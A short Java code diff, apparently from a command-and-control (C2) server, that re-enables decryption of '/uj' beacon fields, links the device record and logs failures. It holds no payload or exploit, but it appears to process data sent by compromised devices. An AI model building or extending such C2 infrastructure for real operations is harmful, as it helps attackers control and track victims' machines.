@@ -33,7 +33,8 @@ public class HandleUj extends AbstractC2Handler {
             return;
         }
         resolveDomain(ctx);
-//        String plain = decrypt(ctx, "result", "d", "f", "u", "d3");
+        // 必须先解密：d/f/u 在明文里，不解密则 DeviceResolver 必然跳过 → uj_decrypt 无 device_row_id
+        String plain = decrypt(ctx, "result", "d", "f", "u", "d3");
 
         // 先解析设备（uj_decrypt 需要 device_row_id）
         String d = ctx.plaintextStr("d");
@@ -41,8 +42,11 @@ public class HandleUj extends AbstractC2Handler {
         String u = ctx.plaintextStr("u");
         deviceResolver.resolveAndLink(ctx, d, f, u, null, null);
 
-        // 落库 uj_decrypt（无论解密成功失败都记录）
+        // 落库 uj_decrypt（无论解密成功失败都记录；无 device 时 store 内部会跳过）
         store.saveUjDecrypt(ctx, ctx.getPlaintext());
+        if (plain == null || plain.isEmpty()) {
+            log.info("异常日志:[c2_handlers] /uj 解密失败或无明文, id={}", ctx.getRecordId());
+        }
 
         log.debug("正常日志:[c2_handlers] call handle_uj 完成, id={}, path={}, decryptOk={}",
                 ctx.getRecordId(), ctx.getPath(), ctx.isDecryptOk());
